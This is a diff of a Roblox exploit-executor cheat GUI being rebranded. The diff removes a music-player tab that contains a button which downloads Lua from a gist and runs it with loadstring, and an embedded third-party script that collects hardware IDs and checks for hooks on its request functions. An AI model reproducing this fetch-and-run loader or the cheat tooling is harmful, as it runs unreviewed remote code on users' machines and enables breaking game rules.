+        TS_G:Create(closeBtn,TweenInfo.new(0.2,Enum.EasingStyle.Quad),{BackgroundColor3=DaHubThemeRGB(28, 28, 28),TextColor3=DaHubThemeRGB(205, 205, 214)}):Play()
+        TS_G:Create(closeBtnStroke,TweenInfo.new(0.2),{Color=DaHubThemeRGB(59, 59, 59),Transparency=0.3}):Play()
     end)
 
     -- Header separator (premium animated silver glow line)
     local hSep = Instance.new("Frame", main)
     hSep.Size = UDim2.new(1,-20,0,1); hSep.Position = UDim2.fromOffset(10,HEADER_H)
-    hSep.BackgroundColor3 = SMKThemeRGB(235, 235, 235); hSep.BackgroundTransparency = 0.45
+    hSep.BackgroundColor3 = DaHubThemeRGB(235, 235, 235); hSep.BackgroundTransparency = 0.45
     hSep.BorderSizePixel = 0; hSep.ZIndex = 4
     Instance.new("UICorner", hSep).CornerRadius = UDim.new(1,0)
     local hSepG = Instance.new("UIGradient", hSep)
     hSepG.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, SMKThemeRGB(255, 255, 255)),
-        ColorSequenceKeypoint.new(0.46, SMKThemeRGB(235, 235, 235)),
-        ColorSequenceKeypoint.new(1, SMKThemeRGB(170, 170, 170)),
+        ColorSequenceKeypoint.new(0, DaHubThemeRGB(255, 255, 255)),
+        ColorSequenceKeypoint.new(0.46, DaHubThemeRGB(235, 235, 235)),
+        ColorSequenceKeypoint.new(1, DaHubThemeRGB(170, 170, 170)),
     })
     hSepG.Transparency = NumberSequence.new({
         NumberSequenceKeypoint.new(0,1), NumberSequenceKeypoint.new(0.12,0.05),
@@ -9683,7 +8882,7 @@ local function buildGui()
     -- Glow line behind separator
     local hSepGlow = Instance.new("Frame", main)
     hSepGlow.Size = UDim2.new(1,-30,0,6); hSepGlow.Position = UDim2.fromOffset(15,HEADER_H-2)
-    hSepGlow.BackgroundColor3 = SMKThemeRGB(170, 170, 170); hSepGlow.BackgroundTransparency = 0.96
+    hSepGlow.BackgroundColor3 = DaHubThemeRGB(170, 170, 170); hSepGlow.BackgroundTransparency = 0.96
     hSepGlow.BorderSizePixel = 0; hSepGlow.ZIndex = 3
     Instance.new("UICorner", hSepGlow).CornerRadius = UDim.new(1,0)
     local hSepGlowG = Instance.new("UIGradient", hSepGlow)
@@ -9693,7 +8892,7 @@ local function buildGui()
     })
 
     -- Drakon-style tabs sit below the header; horizontal scrolling keeps
-    -- every label readable on the compact ＳＭＫㅤＨＵＢ panel.
+    -- every label readable on the compact TERROR 001 panel.
     local TAB_H = 44
     local contentY = HEADER_H + TAB_H + 8
     local contentArea = Instance.new("Frame", main)
@@ -9707,9867 +8906,7 @@ local function buildGui()
     local pages = buildGui_createScrollingPages(contentArea)
     buildSpeedTab(pages); buildMainTab(pages); buildMoveTab(pages); buildConfigTab(pages); buildKeybindsTab(pages)
 
-    -- YouTube Music Player integrado como una pestaña independiente.
-    do
-        local musicPage = pages.Music
-        local heading = Instance.new("TextLabel", musicPage)
-        heading.Name = "MusicHeading"
-        heading.Size = UDim2.new(1, 0, 0, 34)
-        heading.BackgroundTransparency = 1
-        heading.Text = "YOUTUBE MUSIC PLAYER"
-        heading.TextColor3 = C_WHITE
-        heading.Font = Enum.Font.GothamBlack
-        heading.TextSize = 15
-        heading.TextXAlignment = Enum.TextXAlignment.Left
-        heading.LayoutOrder = 1
-
-        local launchButton = Instance.new("TextButton", musicPage)
-        launchButton.Name = "LaunchYouTubeMusic"
-        launchButton.Size = UDim2.new(1, 0, 0, 46)
-        launchButton.BackgroundColor3 = C_CARD
-        launchButton.BackgroundTransparency = 0.08
-        launchButton.BorderSizePixel = 0
-        launchButton.Text = "♫  ABRIR YOUTUBE MUSIC"
-        launchButton.TextColor3 = C_WHITE
-        launchButton.Font = Enum.Font.GothamBold
-        launchButton.TextSize = 13
-        launchButton.AutoButtonColor = false
-        launchButton.LayoutOrder = 2
-        Instance.new("UICorner", launchButton).CornerRadius = UDim.new(0, 14)
-        local launchStroke = Instance.new("UIStroke", launchButton)
-        launchStroke.Color = C_BORDER
-        launchStroke.Thickness = 1
-        launchStroke.Transparency = 0.35
-
-        local musicStatus = Instance.new("TextLabel", musicPage)
-        musicStatus.Name = "MusicStatus"
-        musicStatus.Size = UDim2.new(1, 0, 0, 38)
-        musicStatus.BackgroundTransparency = 1
-        musicStatus.Text = "Pulsa el botón para iniciar el reproductor."
-        musicStatus.TextColor3 = C_GREY
-        musicStatus.Font = Enum.Font.Gotham
-        musicStatus.TextSize = 11
-        musicStatus.TextWrapped = true
-        musicStatus.TextXAlignment = Enum.TextXAlignment.Left
-        musicStatus.LayoutOrder = 4
-
-        -- Botón SMK HUB colocado justo debajo del botón YouTube Music.
-        local confuserButton = Instance.new("TextButton", musicPage)
-        confuserButton.Name = "SMKHubConfuserButton"
-        confuserButton.Size = UDim2.new(1, 0, 0, 42)
-        confuserButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-        confuserButton.BackgroundTransparency = 0
-        confuserButton.BorderSizePixel = 0
-        confuserButton.Text = "SMK HUB"
-        confuserButton.TextColor3 = Color3.fromRGB(0, 0, 0)
-        confuserButton.Font = Enum.Font.GothamBold
-        confuserButton.TextSize = 13
-        confuserButton.AutoButtonColor = false
-        confuserButton.LayoutOrder = 3
-        Instance.new("UICorner", confuserButton).CornerRadius = UDim.new(0, 14)
-        local confuserStroke = Instance.new("UIStroke", confuserButton)
-        confuserStroke.Color = Color3.fromRGB(255, 255, 255)
-        confuserStroke.Thickness = 1
-        confuserStroke.Transparency = 0
-
-        local confuserRunning = false
-        confuserButton.Activated:Connect(function()
-            if confuserRunning then return end
-            confuserRunning = true
-            local originalText = confuserButton.Text
-            confuserButton.Text = "CARGANDO SMK HUB..."
-            task.spawn(function()
-                local ok, err = pcall(function()
-                    local response = game:HttpGet("https://gist.githubusercontent.com/xd-myscript/813506337130a69f73815abf6936525a/raw/f1bd4ef4a9dc92381d0c788ec61fc4fe1f1b5b5b/ghoxtconfuser.lua")
-                    local compiler = loadstring or (type(getgenv) == "function" and getgenv().loadstring)
-                    assert(type(compiler) == "function", "loadstring no está disponible")
-                    local chunk, compileError = compiler(response)
-                    assert(type(chunk) == "function", compileError or "No se pudo compilar Ghoxt Confuser")
-                    chunk()
-                end)
-                confuserButton.Text = ok and "SMK HUB INICIADO" or "ERROR AL INICIAR SMK HUB"
-                if not ok then warn("SMK HUB: " .. tostring(err)) end
-                task.wait(2)
-                confuserButton.Text = originalText
-                confuserRunning = false
-            end)
-        end)
-
-        local musicSource = [====[
-getgenv().YMP = getgenv().YMP or false
-
-if getgenv().YMP then
-	return
-end
-
-getgenv().YMP = true
-task.wait(0.5)
-
-local fn = cloneref or function(arg)
-	return arg
-end
-
-local tweenInfo = TweenInfo.new(0.07, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-local tweenInfo2 = TweenInfo.new(0.16, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-local tbl = { Ordem = "relevance", Data = "any", Duracao = "any", Pagina = 1 }
-local tweenInfo3 = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-local ordem = "relevance"
-local data = "any"
-local duracao = "any"
-local tbl2 = { "relevance", "view" }
-local tbl3 = { "any", "hours", "today", "week", "month", "year" }
-local tbl4 = { "any", "short", "medium", "long" }
-local tbl5 = {}
-local tbl6 = {}
-local tbl7 = {}
-local tbl8 = {}
-local tbl9 = {}
-local tbl10 = {}
-local tbl11 = {}
-local v = fn(game:GetService("CoreGui"))
-local v2 = fn(game:GetService("StarterGui"))
-local screenGui = Instance.new("ScreenGui")
-screenGui.Parent = v
-screenGui.IgnoreGuiInset = true
-HttpService = fn(game:GetService("HttpService"))
-local v3 = fn(game:GetService("Lighting"))
-local v4 = fn(game:GetService("Players"))
-local userId = v4.LocalPlayer.UserId
-local str = v4.LocalPlayer.LocaleId:lower()
-local v5 = fn(game:GetService("LogService"))
-local v6 = fn(game:GetService("TweenService"))
-fn(Instance.new("Sound"))
-local v7 = fn(game:GetService("SoundService"))
-local v8 = fn(game:GetService("Workspace"))
-fn(game:GetService("RunService"))
-fn(game:GetService("TextService"))
-local v9 = fn(game:GetService("UserInputService"))
-local currentCamera = v8.CurrentCamera
-local flag = false
-local flag2 = false
-local screenGui2 = nil
-local n = 1
-local str2 = "Todos"
-local flag3 = false
-local flag4 = false
-local n2 = 0
-local v10 = nil
-local tweenInfo4 = TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-local tweenInfo5 = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-local tweenInfo6 = TweenInfo.new(0.25, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-local flag5 = true
-local flag6 = false
-local str3 = "https://ymp-api.ddns.net"
-local websocket_ = WebSocket or websocket or Websocket or syn and syn.websocket or nil
-local flag7 = false
-local flag8 = false
-local str4 = "Auto"
-local v11 = nil
-local flag9 = false
-local v12 = nil
-local udim2 = nil
-local flag10 = false
-local flag11 = false
-local flag12 = false
-local flag13 = false
-local tween = nil
-local n3 = 0
-local text = nil
-local flag14 = false
-local layoutOrder = 0
-local udim22 = UDim2.new(0, 4, 0, 4)
-local udim23 = UDim2.new(0, 4, 1, 4)
-local flag15 = true
-local tween2 = nil
-local v13 = nil
-local tween3 = nil
-local flag16 = false
-local flag17 = false
-local request_ = request or http_request or syn_request or syn and syn.request or http and http.request or fluxus and fluxus.request or getgenv and getgenv().request
-local requestAsync
-
-if request_ then
-	requestAsync = request_
-else
-	requestAsync = http and http.request_async
-end
-
-local writeClipboard = setclipboard or toclipboard or syn and syn.write_clipboard
-local setclipboard_
-
-if writeClipboard then
-	setclipboard_ = writeClipboard
-else
-	setclipboard_ = fluxus and fluxus.setclipboard
-end
-
-local gethwid_ = gethwid and gethwid()
-
-if not gethwid_ then
-	gethwid_ = syn and syn.gethwid and syn.gethwid()
-end
-
-gethwid_ = gethwid_ or fluxus and fluxus.gethwid and fluxus.gethwid()
-local hwid
-
-if gethwid_ then
-	hwid = gethwid_
-else
-	hwid = getgenv and getgenv().hwid
-end
-
-local v14 = hwid or userId
-local flag18 = typeof(clonefunction) == "function" and clonefunction or nil
-local v15 = flag18 and flag18(pcall) or pcall
-local v16 = flag18 and flag18(typeof) or typeof
-
-CheckRequest = function()
-	local v17 = v15(function()
-		return ishooked
-	end) and ishooked or nil
-
-	local v18 = v15(function()
-		return restorefunction
-	end) and restorefunction or nil
-
-	if v16(v18) == "function" and v16(v17) == "function" then
-		local v19, v20 = v15(v17, v17)
-
-		if v19 and v20 then
-			v15(v18, v17)
-		end
-	end
-
-	if v16(v17) == "function" then
-		local v19, v20 = v15(v17, requestAsync)
-		if v19 and v20 then
-			return false
-		end
-		local v21, v22 = v15(v17, game.HttpGet)
-		if v21 and v22 then
-			return false
-		end
-	end
-
-	return true
-end
-
-if not CheckRequest() then
-	return
-end
-
-local ok, result = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/Youtube%20Music%20Player/Versao")
-
-if not ok or not result or not CheckRequest() then
-	return
-end
-
-local str5 = result:gsub("%s+", ""):gsub("[^%w.]", "")
-
-if str5 == "off" then
-	return
-end
-
-if str5 ~= "8.5" then
-	getgenv().YMP = false
-	-- No ejecutar código Lua remoto del reproductor de música.
-	return
-end
-
-local ok2, result2 = pcall(function()
-	return game:HttpGet("https://raw.githubusercontent.com/Dan41/Roblox-Scripts/refs/heads/main/Youtube%20Music%20Player/Notifications")
-end)
-
-if ok2 then
-	local ok3, result3 = pcall(function()
-		return HttpService:JSONDecode(result2)
-	end)
-
-	if ok3 and result3 then
-		local str6 = (result3.title or ""):gsub("%s+", "")
-		local str7 = (result3.text or ""):gsub("%s+", "")
-
-		if str6 ~= "" or str7 ~= "" then
-			v2:SetCore("SendNotification", {
-				Title = result3.title or "Empty",
-				Text = result3.text or "Empty",
-				Icon = "rbxassetid://83758613781843",
-				Duration = 10,
-			})
-
-			task.wait(5)
-		end
-	end
-end
-
-Carregar = function()
-	if not flag then
-		flag = true
-		screenGui2 = Instance.new("ScreenGui")
-		screenGui2.Parent = v
-		local imageLabel = Instance.new("ImageLabel")
-		imageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-		imageLabel.Size = UDim2.new(0, 0, 0, 0)
-		imageLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
-		imageLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-		imageLabel.Image = "rbxassetid://132058030456598"
-		imageLabel.Active = true
-		imageLabel.Draggable = false
-		imageLabel.Parent = screenGui2
-		local uiCorner = Instance.new("UICorner")
-		uiCorner.CornerRadius = UDim.new(0, 5)
-		uiCorner.Parent = imageLabel
-		local uiStroke = Instance.new("UIStroke")
-		uiStroke.Thickness = 2
-		uiStroke.Color = Color3.fromRGB(255, 0, 0)
-		uiStroke.Parent = imageLabel
-		local tween4 = v6:Create(imageLabel, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Size = UDim2.new(0.4, 0, 0.5, 0), Position = UDim2.new(0.5, 0, 0.4, 0) })
-		tween4:Play()
-
-		tween4.Completed:Connect(function()
-			if not flag then
-				return
-			end
-			flag2 = true
-
-			task.spawn(function()
-				while true do
-					if flag2 and imageLabel.Parent then
-						local tween5 = v6:Create(imageLabel, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(0.5, 0, 0.38, 0) })
-						local tween6 = v6:Create(imageLabel, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), { Position = UDim2.new(0.5, 0, 0.42, 0) })
-						tween5:Play()
-						tween5.Completed:Wait()
-
-						if flag2 then
-							tween6:Play()
-							tween6.Completed:Wait()
-							continue
-						end
-					end
-
-					break
-				end
-			end)
-		end)
-	else
-		flag = false
-		flag2 = false
-
-		if screenGui2 then
-			local imageLabel = screenGui2:FindFirstChildWhichIsA("ImageLabel")
-
-			if imageLabel then
-				local tween4 = v6:Create(imageLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {
-					Position = UDim2.new(0.5, 0, -0.5, 0),
-					BackgroundTransparency = 1,
-					ImageTransparency = 1,
-				})
-
-				tween4:Play()
-
-				tween4.Completed:Connect(function()
-					if screenGui2 then
-						screenGui2:Destroy()
-						screenGui2 = nil
-					end
-				end)
-			else
-				screenGui2:Destroy()
-				screenGui2 = nil
-			end
-		end
-	end
-end
-
-Carregar()
-
-Traducao = {
-	Sucesso = "Success",
-	Erro = "Error",
-	Imcompativel = "Your executor does not have support",
-	Navegacao = "Navigation",
-	Player = "Media Player",
-	Add = "Add New",
-	Equalizador = "Audio adjustment",
-	Welcome = "Welcome",
-	Dev = "Creator",
-	Hey = "Hey you!",
-	Play = "Play a song for me",
-	Volume = "Volume",
-	Freque = "Sound frequencies",
-	Efeitos = "Sound effects",
-	Graves = "Bass",
-	Medios = "Mids",
-	Agudos = "Treble",
-	Nenhum = "None",
-	Todos = "All",
-	Musicas = "Musics",
-	Favoritos = "Favorites",
-	Favoritado = "Added to favorites",
-	Desfavoritado = "Removed from favorites",
-	Excluido = "Content deleted",
-	Vazio = "Empty",
-	VazioTexto = "There is nothing in this category at the moment",
-	Search = "Search",
-	Pesquisar = "Search for a YouTube title or link",
-	Pesquisar2 = "Search for a YouTube title or link, or a Roblox ID",
-	PesquiseTitle = "Start a search",
-	PesquiseText = "We'll do our best to find your video or music",
-	PesquiseTextPL = "We'll search through your entire playlist",
-	SemResutadoTitle = "No results",
-	SemResutadoText = "We checked everywhere possible, but we couldn't find any results for that search",
-	SemResutadoTextPL = "We didn't find any results for that search in your playlist",
-	LocalTitle = "Local Audios",
-	LocalText = "There's nothing here yet, Add new audio files to the 'Local Audio' folder of the script",
-	EscolhaFor = "Select the desired format",
-	Musica = "Music",
-	Cancelar = "Cancel",
-	De = "By",
-	In = "In",
-	ErroCrackTitle = "Request denied",
-	ErroCrackText = "It appears you do not have a valid Premium key",
-	ErroTitle = "Something went wrong",
-	ErroText = "There was an instability on our servers or in your internet connection, Please try again",
-	Aguarde = "Please wait",
-	Dados = "We are obtaining data from your file",
-	MaisUmPauco = "Almost ready",
-	Baixando = "We are downloading your file to add it to your playlist",
-	Baixado = "Download complete!",
-	Terminou = "Everything went well, and it's already been added to your playlist",
-	Priv1 = "Download and play videos",
-	Priv2 = "Advanced search",
-	PP = "Premium Privilege",
-	SobrePri1 = "You will be able to download and watch any YouTube video",
-	SobrePri2 = "Have an advanced search that includes search filters and more pages of results",
-	SobrePri3 = "You can use MiniPlayer to watch videos or control music on a small floating window",
-	SobrePri4 = "Add and listen to any audio from the Roblox library",
-	SobrePri5 = "You will be able to interact in Global Chat and converse with other YouTube Music Player users in real time",
-	SobrePri6 = "The floating button will have a stylish yellow look!",
-	Key = "Enter the Premium key here",
-	Link = "Get a free key",
-	Robux = "Buy a key with Robux",
-	KeyInvalida = "The key you provided is invalid or has expired!",
-	KeyErro = "An error occurred while validating your key, Please try again in a few seconds",
-	JaTemKey = "It seems to me that you already have a registered key",
-	LinkCopiado = "Link copied!",
-	Navegador = "Paste the link into your browser to get the key",
-	TooMany = "Too many requests",
-	RateLi = "You are making too many requests, Wait a few seconds and try again!",
-	KeyError = "An error occurred in the key system, Please try again",
-	OpcaoBloqueadaTitle = "Option blocked",
-	OpcaoBloqueadaText = "Get a Premium key to use this!",
-	NenhumaMidia = "No valid tracks found in your playlist's current category!",
-	PlayMode = "Playback mode",
-	Auto = "Auto-skip: The next track from the current category in your playlist will be selected automatically",
-	Repetir = "Repeat: The current track you are listening to will be repeated on a loop",
-	Random = "Random: The system will randomly select a track from the current category of your playlist",
-	PlayModeRepetir = "No valid tracks found in your playlist's current category, Repeating...",
-	DownloadFazendo = "Wait for the system to finish loading the images",
-	RecursoTi = "Resource unavailable",
-	RecursoTe = "The main equalizer options are not compatible with video",
-	RsetadoEqua = "All the changes you made to the equalizer have been removed!",
-	NaoPodePagina = "You cannot change pages at the moment",
-	NaoPodeFiltro = "Do a search before applying filters!",
-	Processando = "Processing...",
-	Filter = "Search filters",
-	Order = "Order:",
-	UploaDate = "Upload Date:",
-	Duration = "Duration:",
-	AplicarF = "Apply filters",
-	RemoverF = "Remove filters",
-	Relevance = "Relevance",
-	View = "Most viewed",
-	Any = "Any",
-	Hours = "Last hours",
-	Today = "Today",
-	Week = "This week",
-	Month = "This month",
-	Year = "This year",
-	Short = "Short(less than 4 minutes)",
-	Long = "Long(more than 20 minutes)",
-	Medium = "Medium(4 to 20 minutes)",
-	JaTemRoblox = "You already have this Roblox ID in your playlist!",
-	JaTemMusica = "You already have this song in your playlist!",
-	JaTemVideo = "You already have this video in your playlist!",
-	FiltrosRemovidos = "All applied filters have been removed!",
-	FiltrosJaPadrao = "All filters are already defined by default!",
-	Privado = "This audio has been set to private or deleted, It cannot be played",
-	VocePremium = "Validated Key",
-	Keyless = "Global Chat keyless",
-	KeylessOn = "Keyless mode is enabled, Global chat is now unlocked!",
-	KeylessOff = "Keyless mode has been disabled, Global Chat is blocked!",
-	VocePremiumTexto = "Your Premium has been successfully activated, Enjoy your privileges!",
-	Respeito = "Follow the rules to avoid being banned",
-	RegrasTi = "Chat Rules",
-	Regras = "No insults, No racism, No inappropriate or malicious content, No spam, No suspicious links",
-	Sistema = "System",
-	EnvieGc = "Write something...",
-	GcKey = "Get a premium key to send messages in global chat",
-	GcBan = "You have been banned from Global Chat, You can appeal on Discord using your ID:",
-	GcUnban = "You have been unbanned from global chat, Behave yourself to avoid being banned again!",
-	Banido = "You have been banned",
-	Desbanido = "You have been unbanned",
-	ExploitIcomGC = "Your executor does not support Global Chat!",
-	TraducaoSystem = "Translation",
-	TraduOn = "The Global Chat translation system has been enabled",
-	TraduOff = "The Global Chat translation system has been disabled",
-	TextoCopiado = "Copied message",
-	Mutado = "Sounds Removed",
-	Desmutado = "Sounds Restored",
-	SobreMute = "All game sounds have been removed",
-	SobreUnmute = "All the game sounds have been restored",
-	AvisoReport1 = "Report Notice — You are about to report the user",
-	AvisoReport2 = "on Global Chat, Are you sure you want to continue? False reports that do not involve an actual rule violation may result in a ban.",
-	ReportSucesso = "Report sent!",
-	ReportSucesso2 = "Your report has been submitted to our staff team, We will review it and take the necessary actions",
-	MotivoReport = "Enter the reason for the report here",
-	ReportErro = "Report Error",
-	ReportErro1 = "For security reasons, you must have a valid Premium key to submit reports",
-	ReportErro2 = "The reported message could not be found, Are you attempting to submit a false report?",
-	ReportErro3 = "An error occurred while processing the report, Please try again",
-	ReportErro4 = "You can only submit new reports every 2 minutes",
-	ReportErro5 = "Are you seriously trying to report yourself?",
-	ReportErro6 = "You have already reported this message",
-	ReportErro7 = "This message has already been reported by another user",
-	ReportErro8 = "You are banned and cannot submit reports",
-	ReportErro10 = "Write a reason in your report!",
-	ReportErro11 = "The reason must be a minimum of 10 characters and a maximum of 200 characters",
-	Aviso = "Warning",
-	FecharAviso = "Close warn",
-	MsgMod = "Message from the moderator:",
-	Tutorial = "The link has been copied successfully — Paste it into your browser for instructions on how to resolve download errors",
-	Tentando = "Trying Again",
-	TentandoTexto = "We will try downloading again",
-	GCmudo = "Global Chat muted",
-	GCmudoTexto = "New messages will not be notified via the floating button",
-	GCunmudo = "Global Chat unmuted",
-	GCunmudoTexto = "You will be notified of each new message",
-	MidiaErro = "Error loading media",
-	MidiaErroMsg = "Could not load: Unsupported executor or corrupted file",
-}
-
-pcall(function()
-	if str == "en-us" or not Traducao then
-		return
-	end
-	local str6 = str:sub(1, 2)
-	local tbl12 = {}
-	local tbl13 = {}
-	local n4 = 0
-
-	for k, v17 in pairs(Traducao) do
-		n4 += 1
-		tbl12[n4] = k
-		tbl13[n4] = v17
-	end
-
-	local str7 = table.concat(tbl13, " || ")
-
-	local ok3, result3 = pcall(function()
-		return game:HttpGet("https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=" .. str6 .. "&dt=t&q=" .. HttpService:UrlEncode(str7))
-	end)
-
-	if ok3 and result3 then
-		local data2 = HttpService:JSONDecode(result3)
-		local v17 = data2 and data2[1]
-		local str8 = ""
-
-		if v17 then
-			for _, v18 in ipairs(data2[1]) do
-				str8 ..= v18[1] or ""
-			end
-		end
-
-		local parts = str8:split("||")
-
-		for i = 1, n4 do
-			local v18 = parts[i]
-
-			if v18 then
-				Traducao[tbl12[i]] = v18:match("^%s*(.-)%s*$")
-			end
-		end
-	end
-end)
-
-TraduzirMsg = function(arg)
-	local str6 = (str or "en"):sub(1, 2)
-
-	local ok3, result3 = pcall(function()
-		local response = game:HttpGet("https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=" .. str6 .. "&dt=t&q=" .. HttpService:UrlEncode(arg))
-		local data2 = HttpService:JSONDecode(response)
-
-		if data2 and data2[1] then
-			if data2[2] == str6 then
-				return arg
-			end
-			local tbl12 = {}
-
-			for _, v17 in ipairs(data2[1]) do
-				table.insert(tbl12, v17[1] or "")
-			end
-
-			return table.concat(tbl12):match("^%s*(.-)%s*$")
-		end
-
-		return arg
-	end)
-
-	arg = ok3 and result3 or arg
-	return arg
-end
-
-local sound = Instance.new("Sound")
-sound.Looped = false
-sound.Parent = v7
-
-local function fn2(arg)
-	sound.SoundId = "rbxassetid://" .. arg
-	sound:Play()
-end
-
-local function fn3(text2, text3, arg, arg2)
-	if type(text2) ~= "string" then
-		local v17 = tostring
-		text2 = text2 or ""
-		text2 = v17(text2)
-	end
-
-	if type(text3) ~= "string" then
-		local v17 = tostring
-		text3 = text3 or ""
-		text3 = v17(text3)
-	end
-
-	if type(arg) ~= "number" then
-		arg = 3
-	end
-
-	n2 += 1
-	local v17 = n2
-	fn2(arg2 ~= nil and type(arg2) == "number" and tostring(arg2) or "129485210015224")
-	local notifGui = v4.LocalPlayer:WaitForChild("PlayerGui"):FindFirstChild("NotifGui")
-
-	if not notifGui then
-		notifGui = Instance.new("ScreenGui")
-		notifGui.Name = "NotifGui"
-		notifGui.ResetOnSpawn = false
-		notifGui.Parent = v
-	end
-
-	if v10 and v10.Parent then
-		v10:Destroy()
-		v10 = nil
-	end
-
-	local imageButton = Instance.new("ImageButton")
-	imageButton.Size = UDim2.new(0, 0, 0, 0)
-	imageButton.Position = UDim2.new(0.5, 0, 0, 10)
-	imageButton.AnchorPoint = Vector2.new(0.5, 0)
-	imageButton.BackgroundColor3 = Color3.fromRGB(18, 18, 21)
-	imageButton.BackgroundTransparency = 0.08
-	imageButton.BorderSizePixel = 0
-	imageButton.AutomaticSize = Enum.AutomaticSize.Y
-	imageButton.ClipsDescendants = true
-	imageButton.Parent = notifGui
-	local uiCorner = Instance.new("UICorner")
-	uiCorner.CornerRadius = UDim.new(0, 8)
-	uiCorner.Parent = imageButton
-	local uiStroke = Instance.new("UIStroke")
-	uiStroke.Color = Color3.fromRGB(178, 34, 34)
-	uiStroke.Thickness = 0
-	uiStroke.Parent = imageButton
-	local textLabel = Instance.new("TextLabel")
-	textLabel.Size = UDim2.new(1, -10, 0, 25)
-	textLabel.Position = UDim2.new(0, 5, 0, 5)
-	textLabel.BackgroundTransparency = 1
-	textLabel.Text = text2
-	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-	textLabel.Font = Enum.Font.SourceSansBold
-	textLabel.TextScaled = true
-	textLabel.TextXAlignment = Enum.TextXAlignment.Center
-	textLabel.TextYAlignment = Enum.TextYAlignment.Center
-	textLabel.Parent = imageButton
-	local textLabel2 = Instance.new("TextLabel")
-	textLabel2.Size = UDim2.new(1, -10, 0, -2)
-	textLabel2.Position = UDim2.new(0, 5, 0, 35)
-	textLabel2.BackgroundTransparency = 1
-	textLabel2.TextColor3 = Color3.fromRGB(200, 200, 200)
-	textLabel2.Font = Enum.Font.SourceSans
-	textLabel2.Size = UDim2.new(1, -10, 0, 0)
-	textLabel2.AutomaticSize = Enum.AutomaticSize.Y
-	textLabel2.TextWrapped = true
-	textLabel2.TextSize = 20
-	textLabel2.Text = ""
-	textLabel2.TextXAlignment = Enum.TextXAlignment.Center
-	textLabel2.TextYAlignment = Enum.TextYAlignment.Center
-	textLabel2.Parent = imageButton
-	v10 = imageButton
-	local tween4 = v6:Create(imageButton, TweenInfo.new(0.45, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), { Size = UDim2.new(0.45, 0, 0, 70) })
-	imageButton.Size = UDim2.new(0, 0, 0, 70)
-	tween4:Play()
-	task.wait(0.1)
-	uiStroke.Thickness = 2
-	textLabel2.Text = text3
-	local flag19 = false
-
-	local function fn4()
-		if flag19 then
-			return
-		end
-		flag19 = true
-		if not imageButton or not imageButton.Parent then
-			return
-		end
-		textLabel.Text = ""
-		textLabel2.Text = ""
-		local uiStroke2 = imageButton:FindFirstChildOfClass("UIStroke")
-
-		if uiStroke2 then
-			uiStroke2:Destroy()
-		end
-
-		local tween5 = v6:Create(imageButton, TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Size = UDim2.new(0, 0, 0, imageButton.Size.Y.Offset) })
-		tween5:Play()
-
-		tween5.Completed:Connect(function()
-			if not imageButton.Parent then
-				return
-			end
-			local tween6 = v6:Create(imageButton, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.In), { Size = UDim2.new(0, 0, 0, 0) })
-			tween6:Play()
-
-			tween6.Completed:Connect(function()
-				if imageButton then
-					imageButton:Destroy()
-				end
-
-				if v10 == imageButton then
-					v10 = nil
-				end
-			end)
-		end)
-	end
-
-	imageButton.MouseButton1Click:Connect(fn4)
-
-	task.delay(arg, function()
-		if v17 ~= n2 then
-			return
-		end
-		fn4()
-	end)
-end
-
-for _, v17 in ipairs({
-	"writefile",
-	"readfile",
-	"isfile",
-	"delfile",
-	"listfiles",
-	"makefolder",
-	"isfolder",
-	"delfolder",
-	"getcustomasset",
-}) do
-	if type(_G[v17] or getgenv()[v17]) ~= "function" then
-		fn3(Traducao.Erro, Traducao.Imcompativel, 15)
-		Carregar()
-		getgenv().YMP = false
-		return
-	end
-end
-
-if not requestAsync then
-	fn3(Traducao.Erro, Traducao.Imcompativel, 15)
-	Carregar()
-	getgenv().YMP = false
-	return
-end
-
-if not isfolder("YouTube Music Player") then
-	makefolder("YouTube Music Player")
-end
-
-if not isfolder("YouTube Music Player/Musics") then
-	makefolder("YouTube Music Player/Musics")
-end
-
-if not isfolder("YouTube Music Player/Videos") then
-	makefolder("YouTube Music Player/Videos")
-end
-
-if not isfolder("YouTube Music Player/Roblox IDS") then
-	makefolder("YouTube Music Player/Roblox IDS")
-end
-
-if not isfolder("YouTube Music Player/Local Audios") then
-	makefolder("YouTube Music Player/Local Audios")
-end
-
-if not isfolder("YouTube Music Player/Internal") then
-	makefolder("YouTube Music Player/Internal")
-end
-
-if not isfolder("YouTube Music Player/Internal/Cache") then
-	makefolder("YouTube Music Player/Internal/Cache")
-end
-
-if isfolder("YouTube Music Player/Cache") then
-	delfolder("YouTube Music Player/Cache")
-end
-
-if not isfile("YouTube Music Player/Internal/Data.json") then
-	writefile("YouTube Music Player/Internal/Data.json", "[{\"Key\":\"\",\"Favorites\":[]}]")
-end
-
-if not isfile("YouTube Music Player/[ IMPORTANT ] README.txt") then
-	writefile("YouTube Music Player/[ IMPORTANT ] README.txt", [[[ YouTube Music Player ]
-
-This script was developed by @Termux_404
-I am deeply grateful for using my script! :D
-
-[>] If you want to add audio files without downloading them using the script's search and download engine, place the MP3 file in the folder "Local Audios"
-Make sure the file is not corrupted or too large, otherwise the audio will not play.
-
-[ Social media ]
-
-Discord server: https://discord.gg/kbh2dEdnYP
-
-YouTube channel: https://youtube.com/@termux_404
-
-Scriptblox: https://scriptblox.com/u/Termux_404
-
